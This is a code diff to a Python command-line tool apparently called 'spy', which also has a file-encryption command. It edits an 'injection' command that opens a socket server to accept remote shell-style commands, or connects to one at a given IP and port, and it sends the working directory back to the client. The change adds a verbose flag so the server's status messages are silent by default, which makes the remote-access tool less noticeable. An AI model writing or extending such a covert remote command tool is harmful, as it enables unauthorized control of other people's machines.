@@ -89,26 +89,26 @@ def crypt(p, key, dc, ex, cl, v):
         print('\nFile(s) encrypted') if v else None
 
 
-@spy.command(help='Command injection')
+@spy.command(help='Remote commands injection host/client')
 @click.option('-h', '-host', type=click.STRING, help='Host this machine for remote access, pass the port Ex: -h 8080')
 @click.option('-c', '-connect', type=click.STRING, nargs=2, help='Connect to a host by it\' IP, port. Ex: -c 192.168.1.1 8080')
-def injection(h, c):
+@click.option('-v', is_flag=True, default=False, help='on/off verbose mode for server')
+def injection(h, c, v):
     buffer = 1024 ** 2
-
     if h:
         host = socket.gethostbyname(socket.gethostname())
         port = port_verify(h)
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.bind((host, port))
-            print(f'Server online [ host: {host}, port: {port} ] Waiting a connection...')
+            print(f'Server online [ host: {host}, port: {port} ] Waiting a connection...') if v else None
             s.listen()
             conn, addr = s.accept()
             s.setblocking(False)
             with conn:
-                print(f'Client connected: {addr}')
+                print(f'Client connected: {addr}') if v else None
                 while conn:
                     actual_path = os.getcwd()
-                    print('sending path')
+                    print('Cycle initiated') if v else None
                     conn.sendall(bytes(actual_path, 'utf-8'))
                     command = conn.recv(buffer).decode('utf-8').strip()
                     command_arg1 = command.strip().split()[0]
@@ -123,7 +123,7 @@ def injection(h, c):
             s.connect((host, port))
             print(injection_client_msg())
             while True:
-                print('receiving path')
+                print('Cycle initiated') if v else None
                 path = s.recv(buffer).decode('utf-8')
                 command = str(input(f'{host}\\{path}> ')).strip()
                 command_arg1 = command.split()[0]
@@ -132,4 +132,3 @@ def injection(h, c):
                     print(s.recv(buffer).decode('utf-8'))
     else:
         print('Error: No option passed')
-
